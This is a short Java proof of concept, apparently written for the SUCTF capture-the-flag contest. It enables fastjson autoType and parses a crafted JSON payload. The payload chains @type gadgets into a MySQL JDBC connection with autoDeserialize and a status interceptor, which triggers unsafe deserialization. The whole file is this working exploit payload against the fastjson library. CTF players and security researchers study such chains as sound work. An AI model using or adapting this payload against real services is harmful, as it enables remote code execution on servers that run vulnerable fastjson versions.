package com.suctf;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Fastjon_mysql_calc_6 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String exp = "\n" +
                "{\n" +
                "       \"@type\":\"java.lang.AutoCloseable\",\n" +
                "       \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\n" +
                "       \"proxy\": {\n" +
                "              \"connectionString\":{\n" +
                "                     \"url\":\"jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=calc_6.txt\"\n" +
                "              }\n" +
                "       }\n" +
                "}";
        JSON.parseObject(exp);
    }
}
